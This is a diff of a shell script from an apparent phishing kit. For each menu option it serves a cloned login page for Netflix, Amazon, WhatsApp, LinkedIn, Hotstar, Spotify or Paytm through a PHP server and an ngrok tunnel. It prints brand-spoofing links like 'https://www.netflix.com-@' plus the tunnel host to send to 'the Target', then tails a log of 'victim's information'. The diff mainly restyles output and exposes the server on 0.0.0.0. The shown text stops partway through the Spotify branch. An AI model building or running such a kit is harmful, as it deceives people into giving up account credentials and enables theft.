-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://paytm.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://paytm.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
-                          echo ""
                           echo ""
                           tail -f log.txt 
                    else
-   
                           cd signup/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://paytm.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://paytm.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
-                          echo ""
                           echo ""
                           tail -f log.txt 
                 fi
                  
                 break;
-
                 elif [ $option = 08 ] || [ $option = 8 ]
-	        then
-
+            then
                           cd sites/
                           cd Netflix/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.netflix.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.netflix.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt      
-
+                          tail -f log.txt 
                 break;
                 
                 elif [ $option = 09 ] || [ $option = 9 ]
-	        then
-
+            then
                           cd sites/
                           cd instafollow/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.instafollowerspro.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.instafollowerspro.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                 
-                    
-
+                          tail -f log.txt 
                 break;
                 elif [ $option = 10 ] || [ $option = 10 ]
-	        then
+            then
                           cd sites/
                           cd amazonsign/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.amazon.in-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.amazon.in-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
-      
+                          tail -f log.txt
                 break;
                 elif [ $option = 11 ] || [ $option = 11 ]
-	        then
+            then
                           cd sites/
                           cd whatsapp-phishing/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.whatsapp.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.whatsapp.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt               
-     
-
+                          tail -f log.txt
                 break;
                 elif [ $option = 12 ] || [ $option = 12 ]
-	        then
+            then
                           cd sites/
                           cd Linkedin/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://in.linkedin.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://in.linkedin.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt  
-
+                          tail -f log.txt
                 break;
                 elif [ $option = 13 ] || [ $option = 13 ]
-	        then
+            then
                           cd sites/
                           cd Hotstar-otp-bypass/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.hotstar.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.hotstar.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
-     
-
+                          tail -f log.txt 
                 break;
                 elif [ $option = 14 ] || [ $option = 14 ]
-	        then
+            then
                           cd sites/
                           cd spotify/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
